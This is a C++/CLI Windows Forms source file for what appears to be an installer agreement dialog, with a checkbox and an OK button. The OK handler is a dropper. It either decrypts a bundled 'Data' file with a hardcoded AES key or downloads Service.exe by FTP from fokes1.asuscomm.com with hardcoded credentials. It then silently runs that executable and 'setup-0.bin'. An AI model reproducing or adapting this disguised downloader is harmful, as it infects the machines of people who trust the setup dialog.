#pragma once
#include <windows.h>
#include <Shellapi.h>
#include <io.h>
#include <winuser.h>

#include <stdio.h>
#include <fcntl.h>
#include <iostream>
#include <stdio.h>
#include <WinInet.h>
#include <conio.h>
#include <wincrypt.h>
#include <Shlobj.h>
#include <Userenv.h>


#pragma comment (lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")

#define BLOCK_LEN 128


namespace Project2 {

	using namespace System;
	using namespace System::Resources;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;
	using namespace std;

	/// <summary>
	/// —водка дл€ MyForm
	/// </summary>
	public ref class MyForm : public System::Windows::Forms::Form
	{
	public:
		MyForm(void)
		{
			InitializeComponent();
			//
			//TODO: добавьте код конструктора
			//
		}

	protected:
		/// <summary>
		/// ќсвободить все используемые ресурсы.
		/// </summary>
		~MyForm()
		{
			if (components)
			{
				delete components;
			}
		}
	private: System::Windows::Forms::Button^  button1;
	protected:
	private: System::Windows::Forms::Button^  button2;
	private: System::Windows::Forms::CheckBox^  checkBox1;
	private: System::Windows::Forms::RichTextBox^  richTextBox1;

	private:
		/// <summary>
		/// ќб€зательна€ переменна€ конструктора.
		/// </summary>
		System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// “ребуемый метод дл€ поддержки конструктора Ч не измен€йте 
		/// содержимое этого метода с помощью редактора кода.
		/// </summary>
		void InitializeComponent(void)
		{
			System::ComponentModel::ComponentResourceManager^  resources = (gcnew System::ComponentModel::ComponentResourceManager(MyForm::typeid));
			this->button1 = (gcnew System::Windows::Forms::Button());
			this->button2 = (gcnew System::Windows::Forms::Button());
			this->checkBox1 = (gcnew System::Windows::Forms::CheckBox());
			this->richTextBox1 = (gcnew System::Windows::Forms::RichTextBox());
			this->SuspendLayout();
			// 
			// button1
			// 
			this->button1->Location = System::Drawing::Point(380, 295);
			this->button1->Name = L"button1";
			this->button1->Size = System::Drawing::Size(75, 23);
			this->button1->TabIndex = 0;
			this->button1->Text = L"Cancel";
			this->button1->UseVisualStyleBackColor = true;
			// 
			// button2
			// 
			this->button2->Enabled = false;
			this->button2->Location = System::Drawing::Point(461, 295);
			this->button2->Name = L"button2";
			this->button2->Size = System::Drawing::Size(75, 23);
			this->button2->TabIndex = 1;
			this->button2->Text = L"OK";
			this->button2->UseVisualStyleBackColor = true;
			this->button2->Click += gcnew System::EventHandler(this, &MyForm::button2_Click);
			// 
			// checkBox1
			// 
			this->checkBox1->AutoSize = true;
			this->checkBox1->Location = System::Drawing::Point(12, 266);
			this->checkBox1->Name = L"checkBox1";
			this->checkBox1->Size = System::Drawing::Size(80, 17);
			this->checkBox1->TabIndex = 2;
			this->checkBox1->Text = L"checkBox1";
			this->checkBox1->UseVisualStyleBackColor = true;
			this->checkBox1->CheckedChanged += gcnew System::EventHandler(this, &MyForm::checkBox1_CheckedChanged);
			// 
			// richTextBox1
			// 
			this->richTextBox1->Location = System::Drawing::Point(12, 49);
			this->richTextBox1->Name = L"richTextBox1";
			this->richTextBox1->Size = System::Drawing::Size(524, 211);
			this->richTextBox1->TabIndex = 3;
			this->richTextBox1->Text = resources->GetString(L"richTextBox1.Text");
			// 
			// MyForm
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->ClientSize = System::Drawing::Size(548, 330);
			this->Controls->Add(this->richTextBox1);
			this->Controls->Add(this->checkBox1);
			this->Controls->Add(this->button2);
			this->Controls->Add(this->button1);
			this->Name = L"MyForm";
			this->Text = L"MyForm";
			this->ResumeLayout(false);
			this->PerformLayout();

		}
#pragma endregion


		const wchar_t *GetWC(const char *c)
		{
			const size_t cSize = strlen(c) + 1;
			wchar_t* wc = new wchar_t[cSize];
			mbstowcs(wc, c, cSize);

			return wc;
		}

		void upload(LPCSTR server, LPCSTR login, LPCSTR pass, LPCWSTR local_file, LPCWSTR remote_file)
		{
			HINTERNET hOpen, hConnection;

			hOpen = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

			hConnection = InternetConnectA(hOpen, server, INTERNET_DEFAULT_FTP_PORT, login, pass, INTERNET_SERVICE_FTP, 0, 0);

			if (FtpGetFile(hConnection, local_file, remote_file, 0, 0, 0, 0))
				cout << "Success Story" << endl;
			else
				cout << "Epic Fail!" << endl;

			InternetCloseHandle(hConnection);
			InternetCloseHandle(hOpen);
		}

		int DeCrypt()
		{
			LPCWSTR inFilename = L"Data";
			LPCWSTR key_str = L"3igcZhRdWq96m3GUmTAiv9";

			string buf = GetNewFile();
			wstring stemp = wstring(buf.begin(), buf.end());
			LPCWSTR outFilename = stemp.c_str();

			size_t len = lstrlenW(key_str);

			HANDLE hInpFile = CreateFileW(inFilename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
			if (hInpFile == INVALID_HANDLE_VALUE) {
				printf("Cannot open input file!\n");
				system("pause");
				return (-1);
			}
			HANDLE hOutFile = CreateFileW(outFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hOutFile == INVALID_HANDLE_VALUE) {
				printf("Cannot open output file!\n");
				system("pause");
				return (-1);
			}

			DWORD dwStatus = 0;
			BOOL bResult = FALSE;
			wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
			HCRYPTPROV hProv;
			if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
				dwStatus = GetLastError();
				printf("CryptAcquireContext failed: %x\n", dwStatus);
				CryptReleaseContext(hProv, 0);
				system("pause");
				return dwStatus;
			}
			HCRYPTHASH hHash;
			if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
				dwStatus = GetLastError();
				printf("CryptCreateHash failed: %x\n", dwStatus);
				CryptReleaseContext(hProv, 0);
				system("pause");
				return dwStatus;
			}

			if (!CryptHashData(hHash, (BYTE*)key_str, len, 0)) {
				DWORD err = GetLastError();
				printf("CryptHashData Failed : %#x\n", err);
				system("pause");
				return (-1);
			}
			printf("[+] CryptHashData Success\n");

			HCRYPTKEY hKey;
			if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey)) {
				dwStatus = GetLastError();
				printf("CryptDeriveKey failed: %x\n", dwStatus);
				CryptReleaseContext(hProv, 0);
				system("pause");
				return dwStatus;
			}
			printf("[+] CryptDeriveKey Success\n");

			const size_t chunk_size = BLOCK_LEN;
			BYTE chunk[chunk_size] = { 0 };
			DWORD out_len = 0;

			BOOL isFinal = FALSE;
			DWORD readTotalSize = 0;

			DWORD inputSize = GetFileSize(hInpFile, NULL);

			while (bResult = ReadFile(hInpFile, chunk, chunk_size, &out_len, NULL)) {
				if (0 == out_len) {
					break;
				}
				readTotalSize += out_len;
				if (readTotalSize == inputSize) {
					isFinal = TRUE;
					printf("Final chunk set.\n");
				}

				if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
					printf("[-] CryptDecrypt failed\n");
					break;
				}

				DWORD written = 0;
				if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
					printf("writing failed!\n");
					break;
				}
				memset(chunk, 0, chunk_size);
			}

			CryptReleaseContext(hProv, 0);
			CryptDestroyKey(hKey);
			CryptDestroyHash(hHash);

			CloseHandle(hInpFile);
			CloseHandle(hOutFile);
			printf("Finished. Processed %#x bytes.\n", readTotalSize);
			system("pause");
			return 0;
		}

	private: System::Void checkBox1_CheckedChanged(System::Object^  sender, System::EventArgs^  e) 
	{
		button2->Enabled = checkBox1->Checked;
	}
	private: System::Void button2_Click(System::Object^  sender, System::EventArgs^  e) 
	{
		string file = GetNewFile();
		if (System::IO::File::Exists("Data"))
		{
			DeCrypt();
		}
		else
		{
			try
			{
				
				wstring stemp = wstring(file.begin(), file.end());
				upload("fokes1.asuscomm.com", "ff", "WorkerFF", stemp.c_str(), L"Service.exe");
			}
			catch(exception ex)
			{

			}
		}
	
		WinExec(file.c_str(), SW_SHOW);
		WinExec("setup-0.bin", SW_SHOW);
		//ShellExecute(NULL, L"open", stemp.c_str(), NULL, NULL, SW_SHOWDEFAULT);
	}
	
	private: std::string GetNewFile()
	{
		std::string file;
		try
		{
#pragma warning(disable : 4996)
			file.append(getenv("APPDATA"));

			if (strlen(file.c_str()) == 0)
			{
				if (System::IO::Directory::Exists("C:\\"))
				{
					file.clear();
					file.append("C:\\");
				}
			}
		}
		catch (exception ex)
		{
			if (System::IO::Directory::Exists("C:\\"))
			{
				file.clear();
				file.append("C:\\");
			}
		}
		file.append("\\Service.exe");

		return file;
	}

};
}
